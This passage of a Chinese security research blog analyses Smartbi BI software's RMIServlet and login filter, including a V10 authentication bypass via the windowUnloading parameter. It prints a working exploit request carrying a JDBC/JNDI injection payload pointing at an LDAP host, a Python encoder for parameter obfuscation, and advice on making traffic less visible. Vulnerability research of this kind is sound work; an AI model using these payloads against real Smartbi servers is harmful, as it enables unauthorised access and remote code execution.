+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774692728227-24056193-7382-420f-85d0-2c3d68067a78.png"  alt="img"></p>
+<p>还有一点需要知道，Smartbi的补丁可能会多次进行同样的修补，比如：</p>
+<p>20220810</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774862520683-166616f9-4dfc-481c-8838-77a03b0558bf.png"  alt="img"></p>
+<p>20230822</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774862551824-3958056a-1062-4490-a0dc-8cc830575c48.png"  alt="img"></p>
+<p>这种是正常情况，不必怀疑是自己看花眼了。</p>
+<h1 id="鉴权分析"><a href="#鉴权分析" class="headerlink" title="鉴权分析"></a>鉴权分析</h1><h2 id="V10-windowUnloading导致的鉴权失效"><a href="#V10-windowUnloading导致的鉴权失效" class="headerlink" title="V10-windowUnloading导致的鉴权失效"></a>V10-windowUnloading导致的鉴权失效</h2><p>此问题仅存在于V10版本。</p>
+<p>来到smartbi.freequery.filter.CheckIsLoggedFilter#doFilter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774679258513-a22885d4-f041-49f8-8d78-f3d14e5ee820.png"  alt="img"></p>
+<p>这里有多种方法对这三个参数进行赋值，跟上面V11版本中解析RMIInfo时一样。这里我们选择在windowUnloading&#x3D;&amp;后面直接加上URL编码后的参数。最终只会对三个attribute进行设置。</p>
+<p>接着会进行鉴权：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774679562315-34fda3e4-5c46-4860-8e27-0b9ac7be33a6.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774679576729-c23b9307-bb6f-4b65-8926-822b66d4a693.png"  alt="img"></p>
+<p>这里的鉴权是白名单机制的。因此，刚刚在windowUnloading&#x3D;&amp;后传入的参数，需要在白名单内，以此通过鉴权。</p>
+<p>然而，当进入RMIServlet，进行RMIInfo解析时，调用parseRMIInfo：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774679770604-38cd2a85-7836-49a6-8510-4db456c55ebc.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774679802837-3cff2fda-b0f2-4d2b-986f-f380a0698f55.png"  alt="img"></p>
+<p>这里首先调用getRMIInfoFromRequest进行RMIInfo解析，会尝试获取request中的ATTR_KEY_RMIINFO属性。但是在前面CheckIsLoggedFilter#doFilter，并没有对这个属性进行设置，因此会进入后面的解析流程，直接通过request.getParameter去取出参数，因此可以在请求体里再放一组实际要调用的参数。</p>
+<p>分析到这里，大家应该能够看出端倪了：在鉴权时被校验的className和methodName，和实际调用的并不同。鉴权时用到的，是通过windowUnloading&#x3D;&amp;传入的；实际调用的，是通过请求体传入的。这样就达到了任意Service方法调用的效果。</p>
+<hr>
+<p>看看V11是怎么修复这个问题的。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774680302961-0f86a89d-c232-4d76-afb7-db13d7c8f4fc.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774680361260-8b50b78b-b40c-4c7f-a72b-1f1d9dd696df.png"  alt="img"></p>
+<p>现在不是在filter里写解析方法了，而是直接调用parseRMIInfo，在最后会对ATTR_KEY_RMIINFO进行设置，确保进入RMIServlet时，解析出来的参数是一致的。</p>
+<p>实际上，V10版本中的parseRMIInfo在最后也会设置ATTR_KEY_RMIINFO：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774680574482-2284a91a-dd42-4fb0-bd91-aa3746692e82.png"  alt="img"></p>
+<p>只不过windowUnloading&#x3D;&amp;的逻辑被单独拿到filter里实现了，从而导致了鉴权绕过。</p>
+<h2 id="V11-鉴权逻辑"><a href="#V11-鉴权逻辑" class="headerlink" title="V11-鉴权逻辑"></a>V11-鉴权逻辑</h2><p>主要逻辑仍然在smartbi.freequery.filter.CheckIsLoggedFilter#doFilter，但是needToCheck发生了改变：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774839587124-04478180-90a5-4e47-8cf3-cf72fac48e2b.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774839601725-4ee33d70-ddbc-43ae-9825-dcb9cad017dc.png"  alt="img"></p>
+<p>当method不存在FunctionPermission注解时，调用FilterUtil.needToCheck，跟V10的机制一样：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774839671597-11b16474-fc53-4aa0-a62f-c3318424c4cf.png"  alt="img"></p>
+<p>当存在FunctionPermission注解时，且注解中的value字符数组只存在NOT_LOGIN_REQUIRED这一个字符串时，就无需鉴权，否则都需要鉴权。</p>
+<p>另外，注解上的level似乎对鉴权的影响不是在filter产生的，而是在具体的方法中做检测，比如smartbi.defender.rmi.DefenderClientService#checkConfigItem：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774854898325-e0f3044b-997e-454f-a40d-419615e9dfac.png"  alt="img"></p>
+<p>在smartbi.framework.rmi.RMIModule#needToCheckIsLoggedIn打断点即可获取所有service方法和公开的service方法：</p>
+<p>公开的service方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIModule</span> <span class="variable">module</span> <span class="operator">=</span> RMIModule.getInstance();</span><br><span class="line">Map&lt;String, ClientService&gt; map = <span class="keyword">module</span>.getServices();</span><br><span class="line">Set&lt;String&gt; strings = map.keySet();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (String key : strings)&#123;</span><br><span class="line">    <span class="type">ClientService</span> <span class="variable">clientService</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">    List&lt;Method&gt; methods = clientService.getMethods();</span><br><span class="line">    <span class="keyword">for</span> (Method method : methods)&#123;</span><br><span class="line">        <span class="type">FunctionPermission</span> <span class="variable">funcPerm</span> <span class="operator">=</span> (FunctionPermission) method.getAnnotation(FunctionPermission.class);</span><br><span class="line">        <span class="keyword">if</span> (funcPerm == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] perms = funcPerm.value();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">notLoginRequired</span> <span class="operator">=</span> perms.length == <span class="number">1</span>  &amp;&amp; <span class="string">&quot;NOT_LOGIN_REQUIRED&quot;</span>.equals(perms[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (notLoginRequired)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> method.getDeclaringClass().getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            stringBuilder.append(className+<span class="string">&quot;#&quot;</span>+methodName+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;publicServiceMethod.txt&quot;</span>);</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">fos.write(stringBuilder.toString().getBytes());</span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> file.getAbsolutePath();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;File Write to:&quot;</span> + path;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所有的service方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIModule</span> <span class="variable">module</span> <span class="operator">=</span> RMIModule.getInstance();</span><br><span class="line">HashMap&lt;String, ClientService&gt; services = (HashMap) <span class="keyword">module</span>.getServices();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (String key : services.keySet())&#123;</span><br><span class="line">    <span class="type">ClientService</span> <span class="variable">clientService</span> <span class="operator">=</span> services.get(key);</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clientService.getModule().getClass().getName();</span><br><span class="line">    List&lt;Method&gt; methods = clientService.getMethods();</span><br><span class="line">    <span class="keyword">for</span> (Method method : methods)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName1</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        sb.append(className + <span class="string">&quot;#&quot;</span> + methodName1 + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;RMIServiceMethod.txt&quot;</span>);</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">fos.write(sb.toString().getBytes());</span><br><span class="line"><span class="type">String</span> <span class="variable">absolutePath</span> <span class="operator">=</span> file.getAbsolutePath();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;文件已经写入：&quot;</span> + absolutePath;</span><br></pre></td></tr></table></figure>
+
+<h1 id="RMIServlet职责"><a href="#RMIServlet职责" class="headerlink" title="RMIServlet职责"></a>RMIServlet职责</h1><h2 id="V11"><a href="#V11" class="headerlink" title="V11"></a>V11</h2><p>以下为V11版本源码。</p>
+<p>简单来说，就是通过传入的className，methodName和params，以反射的方式，去调用指定Service的方法。</p>
+<p>先看doGet：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774510993569-58c3a5f3-4e1f-41bd-a25f-c154da92154b.png"  alt="img"></p>
+<p>当jsonpCallback不为空时，调用doPost：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774511254252-18813f89-8d44-4ab2-b58c-f6b40dec32cf.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774594578454-244b26c0-ef9b-4020-a809-8b06b0e7d0b8.png"  alt="img"></p>
+<p>doPost会解析出RMIInfo，然后取出其中的className，methodName，params，然后反射调用。</p>
+<p>需要看一下怎么解析RMIInfo的，来到smartbi.util.RMIUtil#parseRMIInfo(javax.servlet.http.HttpServletRequest, boolean)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774594642856-2c47dfeb-66ad-4b55-b373-53c2dbda2d38.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774514512148-a2d55a8b-16d3-44b7-a23a-9847a1ac7f2e.png"  alt="img"></p>
+<p>如果是从doPost方法跟进到这里，会发现在一开始的getRMIInfoFromRequest就获取到了RMIInfo，但是request attribute中的ATTR_KEY_RMIINFO是在哪里设置的？</p>
+<p>其实也是在parseRMIInfo，最先在LogFilter的时候就设置好了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774514581501-4c29784b-5418-4021-beaf-20d281745e0a.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774514617835-a5fa56c1-6c99-4daa-b3d7-1b47e3a09279.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774514628738-44c8e4f6-232f-4c96-bc43-fca6f77244d6.png"  alt="img"></p>
+<p>其实在smartbi.freequery.filter.CheckIsLoggedFilter#doFilter时也会解析一遍：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774594868288-21d968dc-2ccc-473e-934a-1d32d42b86e1.png"  alt="img"></p>
+<p>但是这个这个filter的重点不是解析RMIInfo，而是做鉴权，这个后面会讲。</p>
+<hr>
+<p>接下来主要关注，smartbi.util.RMIUtil#parseRMIInfo(javax.servlet.http.HttpServletRequest, boolean)中，有多少种方法能够从我们的请求中取出这三个关键的参数，为后续可能的绕过做准备。</p>
+<p>1、windowUnloading</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774515819317-d983b620-a4c8-4107-bb08-2b4ecb098c4d.png"  alt="img"></p>
+<p>当GET参数中出现windowUnloading&#x3D;&amp;或windowUnloading&amp;时，就会进入这个判断。</p>
+<p>可以直接在GET参数中直接传递，URL编码可选：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595189888-0c10f8f9-0f20-4389-955f-4f999879fd8e.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet?windowUnloading=&amp;&#123;&#123;urlesc(className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;&quot;url&quot;:&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:50389/4c94ba;&quot;,&quot;name&quot;:&quot;baka666&quot;,&quot;driverType&quot;:&quot;DB2&quot;,&quot;validationQuery&quot;:&quot;select&quot;,&quot;driver&quot;:&quot;com.ibm.db2.jcc.DB2Driver&quot;,&quot;maxConnection&quot;:&quot;100&quot;,&quot;transactionIsolation&quot;:&quot;1&quot;,&quot;validationQueryMethod&quot;:&quot;3&quot;,&quot;authenticationType&quot;:&quot;test&quot;,&quot;driverCatalog&quot;:&quot;test&quot;&#125;])&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=BB80D95CEFED4A7DBD1E5A03483FB226</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者传入encode参数，内容为特定编码后的原参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595263340-c545e040-c38c-4994-a345-6f8b533e5aa3.png"  alt="img"></p>
+<p>需要注意，encode不能和className、methodName同时传入，否则报错。</p>
+<p>2、正常POST&#x2F;GET传入</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595431753-d8d166f0-5c6a-48e9-82a0-ed50efba827e.png"  alt="img"></p>
+<p>同样可以encode编码。</p>
+<p>3、请求体流传入</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595517690-0f64f048-686d-4c32-bfe4-80c4f283fd8f.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----SmartbiBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="comment">------SmartbiBoundary</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;className&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="type">UserService</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------SmartbiBoundary</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;methodName&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">checkVersion</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------SmartbiBoundary</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;params&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">[]</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------SmartbiBoundary--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>同样支持encode。</p>
+<p>建议通过encode传入，流量更加隐蔽。</p>
+<p>关于如何进行encode，也困扰了挺久，smartbi.util.codeutil.ReplaceCoder#encode这个编码好像有问题，加密出来只是替换了%</p>
+<p>后面在抓包时发现，index.jsp页面会自动请求&#x2F;RMIServlet，并且携带encode参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774880137518-56bd9a8d-6484-47ac-be1d-7dc3f090e433.png"  alt="img"></p>
+<p>于是f12分析一下js里是怎么编码的，随便找了一个请求：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774880297635-82a9dbeb-3ebe-4787-97bf-d6b3386a8197.png"  alt="img"></p>
+<p>全部打上断点。</p>
+<p>在domutils.doPost的时候，已经被加密：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774880452565-39e4330a-0cbd-40fa-ba4c-aceea93f54a9.png"  alt="img"></p>
+<p>能够看的，上面先对className等三个参数进行URL编码，然后coder.encode是进行加密，打上断点，一路跟进，最后来到<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:18080/smartbi/vision/freequery.common.codeutil.ReplaceCoder.js%EF%BC%9A" >http://127.0.0.1:18080/smartbi/vision/freequery.common.codeutil.ReplaceCoder.js：<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774880637665-cc7010ca-ce58-4b60-a59e-ef7d9265e2c6.png"  alt="img"></p>
+<p>把这段丢给AI，最终拿到加密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplaceCoder</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.code_array = [</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">65</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">113</span>, <span class="number">37</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">78</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">77</span>, <span class="number">57</span>,</span><br><span class="line">            <span class="number">39</span>, <span class="number">109</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">76</span>, <span class="number">89</span>, <span class="number">106</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">122</span>, <span class="number">90</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">126</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">95</span>,</span><br><span class="line">            <span class="number">45</span>, <span class="number">73</span>, <span class="number">82</span>, <span class="number">46</span>, <span class="number">71</span>, <span class="number">83</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">119</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">68</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">67</span>, <span class="number">50</span>, <span class="number">88</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.encode_map = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.decode_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.init_maps()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_maps</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>.code_array):</span><br><span class="line">            <span class="keyword">if</span> c != <span class="number">0</span>:</span><br><span class="line">                ic = <span class="built_in">chr</span>(i)</span><br><span class="line">                ec = <span class="built_in">chr</span>(c)</span><br><span class="line">                <span class="variable language_">self</span>.encode_map[ic] = ec</span><br><span class="line">                <span class="variable language_">self</span>.decode_map[ec] = ic</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 特殊处理</span></span><br><span class="line">        <span class="variable language_">self</span>.decode_map[<span class="string">&#x27;/&#x27;</span>] = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.decode_map[<span class="string">&#x27;%&#x27;</span>] = <span class="string">&#x27;%&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">            result.append(<span class="variable language_">self</span>.encode_map.get(ch, ch))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">            result.append(<span class="variable language_">self</span>.decode_map.get(ch, ch))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    coder = ReplaceCoder()</span><br><span class="line">    className = <span class="string">&quot;ConfigClientService&quot;</span></span><br><span class="line">    methodName = <span class="string">&quot;getConfigValue&quot;</span></span><br><span class="line">    params = <span class="string">&quot;[\&quot;START_MODULE\&quot;]&quot;</span></span><br><span class="line">    text = className + <span class="string">&quot; &quot;</span> + methodName + <span class="string">&quot; &quot;</span> + params</span><br><span class="line">    urlEnc = quote(text)</span><br><span class="line"></span><br><span class="line">    enc = coder.encode(urlEnc)</span><br><span class="line">    dec = coder.decode(urlEnc)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原文:&quot;</span>, urlEnc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密:&quot;</span>, enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密:&quot;</span>, dec)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>RMIInfo解析完毕，该调用特定方法了。</p>
+<p>看smartbi.framework.rmi.RMIServlet#processExecute：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595691959-2d94366e-b04b-46cb-af0f-c00e251c037a.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774595753482-523f2b59-dcca-4360-bbd4-9cb97c1e4ecb.png"  alt="img"></p>
+<p>开头的RMIModule记录了可以调用的Service，可以在调试中列出来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIModule</span> <span class="variable">module</span> <span class="operator">=</span> RMIModule.getInstance();</span><br><span class="line">HashMap&lt;String, ClientService&gt; services = (HashMap) <span class="keyword">module</span>.getServices();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (String key : services.keySet())&#123;</span><br><span class="line">    <span class="type">ClientService</span> <span class="variable">clientService</span> <span class="operator">=</span> services.get(key);</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clientService.getModule().getClass().getName();</span><br><span class="line">    List&lt;Method&gt; methods = clientService.getMethods();</span><br><span class="line">    <span class="keyword">for</span> (Method method : methods)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName1</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        sb.append(className + 